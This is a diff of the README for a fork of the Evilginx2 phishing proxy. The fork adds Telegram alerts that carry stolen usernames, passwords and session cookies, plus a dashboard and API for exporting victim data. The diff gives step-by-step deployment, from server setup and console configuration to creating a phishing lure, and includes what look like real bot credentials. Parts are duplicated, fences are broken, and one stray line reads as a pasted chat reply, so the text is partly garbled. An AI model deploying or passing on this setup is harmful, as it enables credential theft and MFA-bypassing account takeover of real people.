+    G --> H[Send Document via Telegram API]
+    H --> I[Store message_id<br/>for Future Updates]
+
+    E -->|Subsequent Capture| J[Create Updated TXT File]
+    J --> K[Lookup Existing message_id]
+    K --> L[Call editMessage* API]
+    L --> M[Update Existing Message<br/>No Additional Spam]
+
+```
+
+````
+
+## Workflow Summary
+
+### 1. Session Capture
+When credentials or session tokens are captured, a notification job is created.
+
+### 2. Async Queue
+The notification is added to an asynchronous Telegram queue:
+
+- File: `core/telegram_queue.go`
+- Buffer size: `100` jobs
+- Non-blocking operation
+
+### 3. Queue Benefits
+The proxy remains fully operational even when:
+
+- Telegram is unreachable
+- Telegram API is slow
+- Network connectivity is unstable
+
+Pending notifications remain queued until delivery becomes possible.
+
+### 4. Notification Processing
+Queued jobs are processed by:
 
 ```text
-┌──────────────────────────┐
-│     SESSION CAPTURED     │
-│ (credentials + tokens)   │
-└────────────┬─────────────┘
-             │
-             ▼
-┌──────────────────────────┐
-│   ENQUEUE TELEGRAM JOB   │
-│   (async, non-blocking)  │
-│   Buffer: 100 jobs max   │
-└────────────┬─────────────┘
-             │
-             ▼
-┌──────────────────────────┐
-│   PROCESS TELEGRAM JOB   │
-│ (background goroutine)   │
-└────────────┬─────────────┘
-             │
-     ┌───────┴───────┐
-     ▼               ▼
-┌────────────┐ ┌────────────┐
-│   FIRST    │ │ SUBSEQUENT │
-│  CAPTURE?  │ │  CAPTURE?  │
-└─────┬──────┘ └─────┬──────┘
-      │ YES          │ YES
-      ▼              ▼
-┌────────────────┐ ┌────────────────┐
-│    SEND NEW    │ │ EDIT EXISTING  │
-│ MESSAGE + FILE │ │ MESSAGE + FILE │
-│ (New Telegram  │ │ (Same message  │
-│ notification)  │ │   updated)     │
-└────────────────┘ └────────────────┘
+core/notify.go
+````
+
+### 5. First Capture Flow
+
+1. Generate a `.txt` file containing session data.
+2. Format a Telegram message using MarkdownV2.
+3. Upload the file through the Telegram API.
+4. Store the returned `message_id`.
+
+### 6. Subsequent Capture Flow
+
+1. Generate an updated `.txt` file.
+2. Retrieve the previously stored `message_id`.
+3. Use Telegram's message editing functionality.
+4. Update the existing Telegram message instead of creating a new one.
+
+### Result
+
+✅ One Telegram message per victim/session
+
+✅ Session data remains updated in-place
+
+✅ No notification spam
+
+✅ Resilient to Telegram outages
+
+✅ Non-blocking architecture
+
 ```
+```
+
+### Why This Matters
+
+| Scenario | Without This Feature | With This Feature |
+|:---------|:--------------------|:------------------|
+| You're away from your desk | You miss the capture | Your phone buzzes instantly |
+| You're running 5 campaigns | Hard to monitor all | Each campaign sends separate notifications |
+| A target logs in at 3 AM | You find out in the morning | You get woken up (or see it on your phone) |
+| Multiple tokens captured | You see only the last one | The same message updates with all tokens |
 
 ### Key Files
 
-| File | What It Does |
-|:-----|:-------------|
-| `core/telegram_queue.go` | Manages the async notification queue using a buffered channel |
-| `core/notify.go` | Creates `.txt` files from tokens, formats messages, sends/edits via Telegram API |
-| `core/tele.go` | Low-level Telegram API calls (sendMessage, editMessage, sendDocument, editMessageMedia) |
-| `core/telegram_escape.go` | Escapes special characters for MarkdownV2 formatting |
-| `core/tsession.go` | Struct that defines how session data is formatted for Telegram |
+| File | Purpose |
+|:-----|:--------|
+| `core/telegram_queue.go` | Async notification queue — buffered channel, processes jobs in background, never blocks the proxy |
+| `core/notify.go` | Notification logic — creates `.txt` files, formats messages with MarkdownV2, sends/edits via API |
+| `core/tele.go` | Low-level Telegram API calls — `sendTelegramNotification()`, `editMessageFile()`, etc. |
+| `core/tsession.go` | `TSession` struct — JSON representation of a session for Telegram communication |
+| `core/telegram_escape.go` | Escapes special characters for MarkdownV2 formatting (required by Telegram API) |
 
-<br>
+---
 
 ## 📊 2. Web Dashboard
 
-Access your captured sessions from any browser at `http://YOUR_SERVER_IP:5000`.
+Access your captured sessions from any browser at `http://YOUR_SERVER_IP:5000`. No need to SSH into the server just to check if you've caught anything.
 
-### What You See
+### Dashboard Layout
 
 # 🦊 Evilginx2 — Telegram Edition
 
-### 🌙 Dark Mode
-
-**by @officialmonsterz**
-
----
-
-**🔍 Search...** | **📁 All Phishlets ▼**
-
-**Actions:**
-
-* 📥 Export CSV
-* 📥 Export JSON
-* 🔄 Refresh
+> 🌙 Dark Mode UI
+> Created by **@officialmonsterz**
 
 ---
 
-| # | Phishlet  | Username                                          | Password    | Remote Address |
-| - | --------- | ------------------------------------------------- | ----------- | -------------- |
-| 1 | office365 | [ceo@megacorp.com](mailto:ceo@megacorp.com)       | Winter2024! | 203.0.113.42   |
-| 2 | google    | [admin@startup.io](mailto:admin@startup.io)       | P@ssw0rd    | 198.51.100.7   |
-| 3 | linkedin  | [hr@company.org](mailto:hr@company.org)           | Recruit123  | 192.0.2.88     |
-| 4 | office365 | [finance@corp.net](mailto:finance@corp.net)       | Q1Report!   | 203.0.113.15   |
-| 5 | facebook  | [marketing@brand.com](mailto:marketing@brand.com) | AdBuget2024 | 198.51.100.33  |
+## 📊 Dashboard Overview
+
+| Metric        | Value |
+| ------------- | ----: |
+| Total Records |    42 |
+| Unique Users  |     3 |
+| Display Count |    20 |
 
 ---
 
-**◀ Previous Page** | **Page 1 of 5** | **Next ▶**
+## 🔎 Controls
 
-🟢 **Auto-refresh: ON**
+```text
+[🔍 Search... ]   [📁 All Phishlets ▼]
 
-### Dashboard Features
+[📥 Export CSV]   [📥 Export JSON]   [🔄 Refresh]
+```
 
-| Feature | What It Does |
-|:--------|:-------------|
-| **Search** | Type anything — username, password, IP, phishlet name — and the table filters instantly |
-| **Filter by Phishlet** | Dropdown to show only sessions from a specific phishlet |
-| **Export CSV** | Downloads everything as a spreadsheet-ready CSV file |
-| **Export JSON** | Downloads everything as machine-readable JSON |
-| **Auto-Refresh** | Updates the table every 5 seconds automatically |
-| **Dark Mode** | Toggle between light and dark themes (saved in your browser) |
-| **Pagination** | Navigate through hundreds of sessions |
-| **Click to View Details** | Click any row to see full session data including all tokens and cookies |
+---
+
+## 📋 Records
+
+| # | Phishlet  | Username                                          | Password     | Remote Address |
+| - | --------- | ------------------------------------------------- | ------------ | -------------- |
+| 1 | office365 | [ceo@megacorp.com](mailto:ceo@megacorp.com)       | Winter2024!  | 203.0.113.42   |
+| 2 | google    | [admin@startup.io](mailto:admin@startup.io)       | P@ssw0rd     | 198.51.100.7   |
+| 3 | linkedin  | [hr@company.org](mailto:hr@company.org)           | Recruit123   | 192.0.2.88     |
+| 4 | office365 | [finance@corp.net](mailto:finance@corp.net)       | Q1Report!    | 203.0.113.15   |
+| 5 | facebook  | [marketing@brand.com](mailto:marketing@brand.com) | AdBudget2024 | 198.51.100.33  |
+
+---
+
+## 📄 Pagination
+
+```text
+◀ Previous Page     Page 1 of 5     Next ▶
+
+🟢 Auto-refresh: ON
+```
+
+### Dashboard Features Explained
+
+| Feature | How It Works | Why You Need It |
+|:--------|:-------------|:----------------|
+| **🔍 Search** | Type anything — username, password, IP, phishlet name | Find a specific session quickly among hundreds |
+| **📁 Filter by Phishlet** | Dropdown to show only one phishlet type | Focus on one campaign at a time |
+| **📥 Export CSV** | Downloads all sessions as a CSV file | Import into Excel for your penetration test report |
+| **📥 Export JSON** | Downloads all sessions as JSON | Process programmatically or import into other tools |
+| **🔄 Auto-Refresh** | Refreshes every 5 seconds automatically | Always see the latest captures without refreshing |
+| **🌙 Dark Mode** | Toggle dark/light theme | Comfortable viewing in low-light environments |
+| **📄 Row Click** | Click any row to see full session details | View all cookies and tokens for a session |
+| **🗑️ Delete** | Delete individual sessions | Clean up test data or remove irrelevant captures |
+| **📊 Pagination** | Navigate through pages of results | Handle hundreds or thousands of sessions |
 
 ### REST API Endpoints
 
-The dashboard exposes a full REST API for programmatic access:
+The dashboard exposes a full REST API for programmatic access. This means you can integrate it with other tools or scripts.
+
+# Sessions API
 
 | Endpoint | Method | Purpose |
-|:---------|:-------|:--------|
-| `/api/sessions` | `GET` | List all sessions (supports `?search=`, `?phishlet=`, `?limit=`, `?offset=`) |
-| `/api/sessions/export` | `GET` | Export all sessions (`?format=csv` or `?format=json`) |
-| `/api/sessions/{id}` | `GET` | Get a single session with full details and tokens |
-| `/api/sessions/{id}` | `DELETE` | Delete a single session |
+|----------|--------|---------|
+| `/api/sessions` | `GET` | List all sessions |
+| `/api/sessions?search=admin` | `GET` | Search sessions by keyword |
+| `/api/sessions?phishlet=office365` | `GET` | Filter sessions by phishlet name |
+| `/api/sessions?limit=10&offset=0` | `GET` | Pagination (10 results per page, first page) |
+| `/api/sessions/export?format=csv` | `GET` | Export all sessions as CSV |
+| `/api/sessions/export?format=json` | `GET` | Export all sessions as JSON |
+| `/api/sessions/{id}` | `GET` | Retrieve full details for a specific session |
+| `/api/sessions/{id}` | `DELETE` | Delete a specific session |
 
-<br>
-
-## 💾 3. BuntDB Embedded Database
-
-No more parsing plain text log files. This fork uses **BuntDB** — an embedded, zero-configuration, key-value database written entirely in Go.
-
-### Why BuntDB?
-
-| Requirement | Plain Text Logs | MySQL/PostgreSQL | BuntDB (This Fork) |
-|:------------|:---------------:|:----------------:|:------------------:|
-| **Setup Time** | None | 30-60 mins | **None!** |
-| **External Server** | No | Yes | **No** |
-| **Dependencies** | None | Many | **None** |
-| **Query Capability** | grep only | Full SQL | **JSON indexes** |
-| **Backup** | cp file | mysqldump | **cp file** |
-| **Memory Footprint** | 0 MB | 100+ MB | **~5 MB** |
-| **Crash Recovery** | Manual | Complex | **Auto (append-only)** |
-| **Concurrent Access** | ❌ No | ✅ Yes | **✅ Yes (RWMutex)** |
-
-### Database Schema (Simplified)
-
-Each captured session stores:
-- **Id**: Auto-incremented unique ID
-- **Phishlet**: Which phishlet captured it (e.g., "office365")
-- **Username**: Victim's email/username
-- **Password**: Victim's password
-- **CookieTokens**: Session cookies (the 2FA bypass)
-- **BodyTokens**: Tokens from response body
-- **HttpTokens**: Tokens from HTTP headers
-- **LandingURL**: The lure URL the victim visited
-- **RemoteAddr**: Victim's IP address
-- **UserAgent**: Browser user agent string
-
-<br>
-
-## 🐳 4. Multi-Stage Docker Build (~18MB)
-
-This fork includes a production-ready multi-stage Docker build that produces a minimal ~18MB Alpine-based image.
-
-### Build Process
-
-# Multi-Stage Docker Build Architecture
-
-## Stage 1: Builder
-
-```text
-┌────────────────────────────────────┐
-│ FROM golang:1.22-alpine            │
-│                                    │
-│ • Installs: git, ca-certificates   │
-│ • Downloads Go dependencies        │
-│ • Compiles static binary           │
-│                                    │
-│ Output: /build/evilginx (~25 MB)   │
-└────────────────────────────────────┘
-```
-
-⬇
-
-## Stage 2: Runtime
-
-```text
-┌────────────────────────────────────┐
-│ FROM alpine:latest                 │
-│                                    │
-│ • Installs: ca-certificates,       │
-│   tzdata, libcap                   │
-│ • Creates 'evilginx' non-root user │
-│ • Copies binary from builder       │
-│ • Sets cap_net_bind_service=+ep    │
-│   (allows binding ports <1024)     │
-│                                    │
-│ FINAL IMAGE SIZE: ~18 MB           │
-└────────────────────────────────────┘
-```
-
-## Build Flow
-
-```text
-┌───────────────────────────────┐
-│ golang:1.22-alpine            │
-│ Build Environment             │
-└───────────────┬───────────────┘
-                │
-                ▼
-      Compile Evilginx Binary
-                │
-                ▼
-      /build/evilginx (~25 MB)
-                │
-                ▼
-┌───────────────────────────────┐
-│ alpine:latest                 │
-│ Minimal Runtime Environment   │
-└───────────────┬───────────────┘
-                │
-                ▼
-     Copy Binary + Dependencies
-                │
-                ▼
-      Final Image (~18 MB)
-```
-
-<br>
-
----
-
-<br>
-
-# 🚀 Quick Start
-
-### Prerequisites
-
-- **Ubuntu 20.04+ or Debian 11+ VPS** (any cloud provider — DigitalOcean, Vultr, Hetzner)
-- **A registered domain** (e.g., `yourdomain.com`)
-- **A Cloudflare account** (free tier)
-- **A Telegram account**
-
-### One-Line System Preparation
+### API Examples
 
 ```bash
-sudo apt update && sudo apt install wget curl git make build-essential nginx certbot python3-certbot-nginx screen fail2ban htop net-tools ufw -y
+# List all sessions (authenticated)
+curl -u admin:mypass1234 "http://YOUR_SERVER_IP:5000/api/sessions"
+
+# Search for sessions with "admin" in username
+curl -u admin:mypass1234 "http://YOUR_SERVER_IP:5000/api/sessions?search=admin"
+
+# Filter by phishlet
+curl -u admin:mypass1234 "http://YOUR_SERVER_IP:5000/api/sessions?phishlet=office365"
+
+# Export all sessions as CSV file
+curl -u admin:mypass1234 "http://YOUR_SERVER_IP:5000/api/sessions/export?format=csv" -o sessions.csv
+
+# Export all sessions as JSON file
+curl -u admin:mypass1234 "http://YOUR_SERVER_IP:5000/api/sessions/export?format=json" -o sessions.json
+
+# Delete session with ID 1
+curl -u admin:mypass1234 -X DELETE "http://YOUR_SERVER_IP:5000/api/sessions/1"
+
+Key File
+
+File	Purpose
+core/dashboard.go	HTTP server, HTML template, REST API handlers, basic auth middleware — everything in one file
+
+💾 3. BuntDB Embedded Database
+No more parsing plain text log files. This fork uses BuntDB — an embedded, zero-configuration, key-value database written in Go, specifically designed for projects that need a database without the complexity of running a separate database server.
+
+Why BuntDB Instead of Plain Text Logs or MySQL?
+
+┌──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┐
+│                                               DATABASE COMPARISON                                                         │
+├────────────────────────────┬────────────────────┬────────────────────┬────────────────────────────────────────────────────┤
+│      REQUIREMENT           │  PLAIN TEXT LOGS   │  MySQL/PostgreSQL  │  BUNTDB (THIS FORK)                               │
+├────────────────────────────┼────────────────────┼────────────────────┼────────────────────────────────────────────────────┤
+│  Setup Time                │  None              │  30-60 minutes     │  None! (zero configuration)                        │
+│  External Server Needed    │  No                │  Yes (separate)    │  No (embedded in the binary)                       │
+│  Dependencies to Install   │  None              │  Many (server,     │  None (everything compiled in)                     │
+│                            │                    │  client, drivers)  │                                                    │
+│  Query Capability          │  grep only         │  Full SQL          │  JSON indexes (search by any field)                │
+│  Backup Procedure          │  cp file           │  mysqldump         │  cp file (that's it)                                │
+│  Memory Footprint          │  0 MB              │  100+ MB           │  ~5 MB                                              │
+│  Crash Recovery            │  Manual (corrupt)  │  Complex (WAL)     │  Auto (append-only, never corrupts)                │
+│  Concurrent Access         │  ❌ No             │  ✅ Yes            │  ✅ Yes (RWMutex built in)                          │
+│  Schema Migrations         │  N/A               │  Required          │  No schema needed (JSON documents)                 │
+│  Can You Just Copy It?     │  Yes (cp)          │  No (mysqldump)    │  Yes (just cp the file)                             │
+└────────────────────────────┴────────────────────┴────────────────────┴────────────────────────────────────────────────────┘
+
+What This Means For You
+No setup: You don't need to install MySQL, PostgreSQL, or any database server
+No maintenance: BuntDB is embedded in the Evilginx binary. It just works.
+Portable: The entire database is a single file (.evilginx/sessions.db). You can copy it to another server and keep working.
+Fast: Queries are indexed and fast, even with thousands of sessions
+Safe: Append-only logging means crashes don't corrupt your data
+Database Schema (Technical)
+
+type Session struct {
+    Id           int                                    // Auto-incremented unique ID
+    Phishlet     string                                 // e.g. "office365", "google", "linkedin"
+    LandingURL   string                                 // The lure URL the victim visited
+    Username     string                                 // Captured username or email address
+    Password     string                                 // Captured password
+    Custom       map[string]string                      // Custom fields from the phishlet template
+    BodyTokens   map[string]string                      // Tokens extracted from HTTP response body
+    HttpTokens   map[string]string                      // Tokens extracted from HTTP headers
+    CookieTokens map[string]map[string]*CookieToken     // Session cookies (the 2FA bypass magic)
+    SessionId    string                                 // Unique UUID for this session
+    UserAgent    string                                 // Victim's browser user-agent string
+    RemoteAddr   string                                 // Victim's IP address
+    CreateTime   int64                                  // Unix timestamp when session was created
+    UpdateTime   int64                                  // Unix timestamp of last update
+    Cmsgid       string                                 // Telegram credential message ID (for updates)
+    Tmsgid       string                                 // Telegram token message ID (for updates)
+}
+
+Key Files
+
+File	Purpose
+database/database.go	BuntDB wrapper — NewDatabase() initialization, helper functions, CRUD dispatch
+database/db_session.go	Session struct definition + all CRUD operations (Create, List, Update, Delete, Search)
+
+🐳 4. Multi-Stage Docker Build (~18MB Alpine)
+This fork includes a production-ready multi-stage Docker build that produces a minimal ~18MB Alpine-based image.
+
+Why Multi-Stage Docker?
+Traditional Docker builds put everything in one image — the compiler, the source code, the build tools — resulting in a huge image (often 500MB+). Multi-stage builds separate the build environment (where you compile the code) from the runtime environment (where you run the compiled program). The result: a tiny, secure, production-ready image.
+
+Docker Build Architecture
+
+┌─────────────────────────────────────────────────────────────────────────────┐
+│                        DOCKER BUILD ARCHITECTURE                            │
+│                                                                             │
+│  STAGE 1: BUILDER (build environment)                                      │
+│  ┌─────────────────────────────────────────────────────────────────────┐   │
+│  │  FROM golang:1.22-alpine                                          │   │
+│  │                                                                     │   │
+│  │  • Installs: git, ca-certificates, build-base                       │   │
+│  │  • Copies go.mod + go.sum → go mod download (cached for speed)     │   │
+│  │  • Copies the source code                                          │   │
+│  │  • Builds with: CGO_ENABLED=0, -ldflags="-s -w" (stripped binary)  │   │
+│  │  • Output: /build/evilginx (single static binary — NO dependencies) │   │
+│  │                                                                     │   │
+│  │  💡 LAYER CACHING: go.mod and go.sum rarely change, so Docker      │   │
+│  │     caches the "go mod download" step. Only when dependencies       │   │
+│  │     change does this layer rebuild. Saves minutes per build.        │   │
+│  └─────────────────────────────────────────────────────────────────────┘   │
+│                               │                                             │
+│                               ▼                                             │
+│  STAGE 2: RUNTIME (production environment)                                 │
+│  ┌─────────────────────────────────────────────────────────────────────┐   │
+│  │  FROM alpine:latest                                               │   │
+│  │                                                                     │   │
+│  │  • Installs: ca-certificates, tzdata, libcap                        │   │
+│  │    (ca-certificates = SSL verification)                              │   │
+│  │    (tzdata = timezone data for logs)                                 │   │
+│  │    (libcap = allows binding privileged ports as non-root)           │   │
+│  │                                                                     │   │
+│  │  • Creates 'evilginx' user (non-root! — security best practice)     │   │
+│  │                                                                     │   │
+│  │  • Copies ONLY the compiled binary from the builder stage           │   │
+│  │  • Copies phishlets/ and redirectors/ directories                   │   │
+│  │                                                                     │   │
+│  │  • Sets cap_net_bind_service=+ep (allows binding ports <1024        │   │
+│  │    like port 53, 80, 443 as a non-root user)                       │   │
+│  │                                                                     │   │
+│  │  • Runs as non-root 'evilginx' user (not root — reduces attack      │   │
+│  │    surface if container is compromised)                             │   │
+│  │                                                                     │   │
+│  │  • Exposes ports: 53 (DNS), 80 (HTTP), 443 (HTTPS), 5000 (Dashboard)│   │
+│  │  • Volume: /home/evilginx/.evilginx (persistent data storage)        │   │
+│  │                                                                     │   │
+│  │  • FINAL IMAGE SIZE: ~18MB (vs 500MB+ for single-stage build)      │   │
+│  └─────────────────────────────────────────────────────────────────────┘   │
+│                                                                             │
+└─────────────────────────────────────────────────────────────────────────────┘
 
 
-Step 1: Install Go 1.22.5
+Security Benefits of This Docker Setup
+
+Feature	Why It Matters
+Non-root user	If the container is compromised, the attacker doesn't have root access to the host
+cap_net_bind_service	Allows binding ports <1024 as non-root (53, 80, 443) — no need to run as root
+~18MB image	Smaller attack surface — fewer packages means fewer potential vulnerabilities
+Alpine Linux	Minimal base image — contains only what's needed, nothing extra
+Volume for data	Database persists even if the container is replaced or updated
+
+Key Files
+
+File	Purpose
+Dockerfile	Multi-stage build definition — builder + runtime stages
+.dockerignore	Excludes unnecessary files from Docker build context (source cache, etc.)
+docker-compose.yml	Docker Compose configuration for easy deployment
+
+📁 5. Auto-Export System
+Every captured session is automatically saved to disk as both JSON and CSV files. This ensures you never lose data, even if the database gets corrupted or you need to share data with team members.
+
+How Auto-Export Works
+
+┌──────────────────────────────────────────────┐
+│           SESSION CAPTURED                    │
+└──────────────────┬───────────────────────────┘
+                   │
+                   ▼
+┌──────────────────────────────────────────────┐
+│         1. Save to BuntDB                     │
+│         2. Auto-Export to file                │
+└──────────────────┬───────────────────────────┘
+                   │
+                   ▼
+    ┌──────────────────────────────┐
+    │   📁 exports/ directory      │
+    │                              │
+    │  ├── session_1.json          │
+    │  ├── session_1.csv           │
+    │  ├── session_2.json          │
+    │  ├── session_2.csv           │
+    │  └── ...                     │
+    │                              │
+    │  Also appends to:            │
+    │  ├── all_sessions.json       │
+    │  └── all_sessions.csv        │
+    └──────────────────────────────┘
+
+
+Why Auto-Export Matters
+Redundancy: Your data is in the database AND in files on disk
+Reporting: CSV files are ready to open in Excel or Google Sheets
+Sharing: JSON files can be shared with team members or imported into other tools
+Archiving: You can archive exported files after a campaign for record-keeping
+
+🔒 6. Wildcard SSL Support (TLD Wildcard)
+IMPORTANT CLARIFICATION ON WILDCARD SSL vs AUTOCERT:
+
+The Situation
+You mentioned you have a TLD wildcard DNS record (*.entreexampdremd.online pointing to your server IP). This is when Cloudflare or your DNS provider has a wildcard A record that catches ALL subdomains.
+
+How Autocert Behaves with a Wildcard DNS Record
+
+┌─────────────────────────────────────────────────────────────────────────────┐
+│                    WILDCARD DNS vs AUTOCERT EXPLAINED                      │
+├─────────────────────────────────────────────────────────────────────────────┤
+│                                                                             │
+│  📌 What is a Wildcard DNS Record?                                        │
+│  A DNS record like:  *.entreexampdremd.online  →  173.44.141.147         │
+│                                                                             │
+│  This means ANY subdomain works: login.yourdomain.com,                     │
+│  test.yourdomain.com, anything.yourdomain.com — all point to your server. │
+│                                                                             │
+│  📌 How Autocert (Let's Encrypt) Works with This                          │
+│                                                                             │
+│  When you set `config autocert on`, Evilginx requests SSL certificates     │
+│  for EACH subdomain individually as soon as you hostname a phishlet:       │
+│                                                                             │
+│    phishlets hostname office365 yourdomain.com                             │
+│      → Evilginx requests cert for login.yourdomain.com                     │
+│                                                                             │
+│    phishlets hostname google yourdomain.com                                │
+│      → Evilginx requests cert for accounts.yourdomain.com                  │
+│                                                                             │
+│  Each certificate covers ONE specific subdomain (not wildcard).            │
+│                                                                             │
+│  📌 So KEEP autocert ON                                                    │
+│                                                                             │
+│  The wildcard DNS record makes sure ALL subdomains RESOLVE to your server, │
+│  but autocert still needs to request certificates for each one.            │
+│                                                                             │
+│  ✅ Wildcard DNS = All subdomains point here                               │
+│  ✅ Autocert ON = SSL certificates are issued for each subdomain           │
+│  🔄 They work together perfectly.                                          │
+│                                                                             │
+│  📌 Why NOT Use a Single Wildcard SSL Certificate?                         │
+│                                                                             │
+│  - Let's Encrypt does NOT issue wildcard certificates via HTTP-01          │
+│    validation (the method Evilginx uses).                                  │
+│  - Wildcard certs require DNS-01 validation (DNS API integration).         │
+│  - Evilginx uses autocert per-subdomain, which is simpler and works fine.  │
+│                                                                             │
+└─────────────────────────────────────────────────────────────────────────────┘
+
+Bottom Line
+Keep config autocert on. The wildcard DNS record is useful because:
+
+You don't need to create individual A records for each subdomain
+Any subdomain you use will automatically resolve to your server
+Autocert will handle getting SSL certificates for each subdomain you enable
+The wildcard DNS + autocert work together — one handles resolution, the other handles certificates.
+
+🚀 Quick Start
+This section gives you the fastest path from zero to running Evilginx3. For a complete step-by-step guide with explanations, see the DEPLOYMENT.md [blocked] guide.
+
+Prerequisites
+A VPS (Virtual Private Server) running Ubuntu 20.04+ or Debian 11+
+A domain name pointed to your server via Cloudflare (DNS Only mode — grey cloud)
+A Telegram account (for notifications)
+SSH access to your server
+
+One-Line System Prep
+
+sudo apt update && sudo apt install wget curl git make build-essential screen fail2ban htop net-tools ufw -y
+
+Step 1: Fix DNS Port Conflict (Critical!)
+
+sudo systemctl stop systemd-resolved && sudo systemctl disable systemd-resolved
+sudo rm -f /etc/resolv.conf
+echo "nameserver 1.1.1.1" | sudo tee /etc/resolv.conf
+echo "nameserver 1.0.0.1" | sudo tee -a /etc/resolv.conf
+sudo chattr +i /etc/resolv.conf
+
+Step 2: Install Go 1.22.5
 
 cd ~
 wget https://go.dev/dl/go1.22.5.linux-amd64.tar.gz
@@ -659,99 +873,107 @@ source ~/.bashrc
 go version
 # Expected: go version go1.22.5 linux/amd64
 
-Step 2: Clone & Build
+Step 3: Configure Firewall
 
-cd ~
+sudo ufw allow 22/tcp && sudo ufw allow 53/udp && sudo ufw allow 80/tcp
+sudo ufw allow 443/tcp && sudo ufw allow 5000/tcp
+sudo ufw --force enable
+sudo ufw status
+
+Step 4: Clone and Build
+
+cd /root
 git clone https://github.com/officialmonsterz/evilginx2.git
 cd evilginx2
 go mod tidy
 go build -o evilginx2 .
 chmod +x evilginx2
 
-Step 3: Configure Firewall
-
-sudo ufw allow 22/tcp
-sudo ufw allow 53/udp
-sudo ufw allow 80/tcp
-sudo ufw allow 443/tcp
-sudo ufw allow 5000/tcp
-sudo ufw --force enable
-
-Step 4: Fix DNS Port Conflict
-
-sudo systemctl stop systemd-resolved
-sudo systemctl disable systemd-resolved
-sudo rm -f /etc/resolv.conf
-echo "nameserver 1.1.1.1" | sudo tee /etc/resolv.conf
-echo "nameserver 1.0.0.1" | sudo tee -a /etc/resolv.conf
-sudo chattr +i /etc/resolv.conf
-
 Step 5: Run Evilginx3 with Dashboard
 
 ./evilginx2 -dashboard 0.0.0.0:5000 -dashboard-user admin -dashboard-pass YOUR_STRONG_PASSWORD
 
-Step 6: Basic Configuration (inside the evilginx> prompt)
+
+Step 6: Configure Inside the Console
+
 
 
 : config domain yourdomain.com
 : config ipv4 external YOUR_SERVER_IP
 : config autocert on
 : config unauth_url https://www.google.com
-: config teletoken YOUR_BOT_TOKEN
-: config chatid YOUR_CHAT_ID
+: config teletoken YOUR_TELEGRAM_BOT_TOKEN
+: config chatid YOUR_TELEGRAM_CHAT_ID
+: test telegram
+Step 7: Enable a Phishlet and Create a Lure
 
-Step 7: Enable a Phishlet
+
 
 : phishlets hostname office365 yourdomain.com
 : phishlets enable office365
 : lures create office365
 : lures get-url 0
-For a complete step-by-step deployment with every detail explained, see the DEPLOYMENT.md file.
+That's it! The URL displayed is your phishing link. Send it to your target (during an authorized test).
+
+For a full, step-by-step, layman's guide covering every detail with explanations, see DEPLOYMENT.md [blocked].
+
 
 📱 Telegram Integration
-How to Set Up
+How to Set Up Telegram Notifications
 Step 1: Create a Telegram Bot
-
 Open Telegram and search for @BotFather
 Send: /newbot
-Choose a name (e.g., My Evilginx Notifier)
-Choose a username ending in _bot (e.g., my_evilginx_bot)
-Copy the bot token — looks like: 8863425004:AAF7mZ0poUo6dal8-8FgUNgRkIhkPlylAvo
+Choose a display name (e.g., My Security Monitor)
+Choose a username ending in _bot (e.g., my_security_bot)
+Copy the bot token — it looks like: 8863425004:AAF7mZ0poUo6dal8-8FgUNgRkIhkPlylAvo
 Step 2: Get Your Chat ID
 
-Message your bot on Telegram first
-Run: curl -s "https://api.telegram.org/botYOUR_TOKEN/getUpdates"
-Find your chat ID: "chat":{"id":7545456339,...}
+# First, message your bot on Telegram (send any message)
+# Then run:
+curl -s "https://api.telegram.org/botYOUR_TOKEN/getUpdates"
+Look for: "chat":{"id":7545456339,...} — that number is your Chat ID.
 
 Step 3: Configure in Evilginx Console
 
 : config teletoken 8863425004:AAF7mZ0poUo6dal8-8FgUNgRkIhkPlylAvo
 : config chatid 7545456339
 : test telegram
+You should receive a test message in Telegram within seconds.
+
+What You Get
+Instant notification when credentials are captured
+Credentials displayed in the message: username, password, IP, user agent
+Token file attached as a .txt download — ready to import into your browser
+Auto-updating messages — if more tokens arrive, the same message is updated (no spam)
+Async delivery — Telegram notifications never slow down the phishing proxy
 
 
 📊 Web Dashboard
 Accessing the Dashboard
+Open your browser and visit:
+
+
+
 
 http://YOUR_SERVER_IP:5000
-Login with the credentials you set via -dashboard-user and -dashboard-pass.
+Login with the credentials you set via -dashboard-user and -dashboard-pass flags.
 
-API Examples
+Dashboard Features
+View all captured sessions in a clean table
+Search by username, password, IP address, or phishlet name
+Filter by specific phishlet (show only Office 365 captures, for example)
+Export all data as CSV or JSON with one click
+Delete individual sessions
+View full session details including all captured cookies and tokens
+Dark mode toggle for comfortable nighttime use
+Auto-refresh every 5 seconds
+REST API
+The dashboard exposes a full REST API for programmatic access. See the API Endpoints section above for details.
 
-# List all sessions
-curl -u admin:password "http://YOUR_IP:5000/api/sessions"
 
-# Search sessions
-curl -u admin:password "http://YOUR_IP:5000/api/sessions?search=admin"
-
-# Export CSV
-curl -u admin:password "http://YOUR_IP:5000/api/sessions/export?format=csv" -o sessions.csv
-
-# Delete a session
-curl -u admin:password -X DELETE "http://YOUR_IP:5000/api/sessions/1"
 
 🐳 Docker Support
-Build & Run
+Quick Build & Run
 
 # Build the image
 docker build -t evilginx2-telegram .
@@ -768,7 +990,8 @@ docker run -d \
   evilginx2-telegram \
   -dashboard 0.0.0.0:5000 \
   -dashboard-user admin \
-  -dashboard-pass mypass1234
+  -dashboard-pass YOUR_STRONG_PASSWORD
+
 
 Docker Compose
 
@@ -788,103 +1011,172 @@ services:
     command: >
       -dashboard 0.0.0.0:5000
       -dashboard-user admin
-      -dashboard-pass mypass1234
+      -dashboard-pass YOUR_STRONG_PASSWORD
 
 volumes:
   evilginx-data:
 
 🧬 Architecture & Data Flow
+Complete System Architecture
+
+┌──────────────────────────────────────────────┐
+│                  MAIN.GO                     │
+│          Entry Point + Flag Parser            │
+│  Parses command-line flags, initializes all   │
+│  components, starts the system                │
+└────┬──────┬──────┬──────┬────┘
+     │      │      │      │
+     │      │      │      │
+     ▼      ▼      ▼      ▼
+┌──────────────────┐  ┌──────────────────┐  ┌──────────────────┐
+│   NAMESERVER     │  │     CERTDB       │  │   HTTP PROXY     │
+│   (DNS Server)   │  │  (SSL Certs)     │  │  (MITM Engine)   │
+│                  │  │                  │  │                  │
+│  core/nameserver │  │  core/certdb     │  │  core/http_proxy │
+│  .go             │  │  .go             │  │  .go             │
+│                  │  │                  │  │                  │
+│  Handles DNS     │  │  Manages SSL     │  │  The core MITM   │
+│  requests for    │  │  certificates    │  │  reverse proxy   │
+│  your domain.    │  │  from Let's      │  │  that intercepts │
+│  Resolves to     │  │  Encrypt.        │  │  credentials and │
+│  your server.    │  │  Auto-renewal.   │  │  session cookies. │
+└──────────────────┘  └──────────────────┘  └────────┬──────────┘
+                                                     │
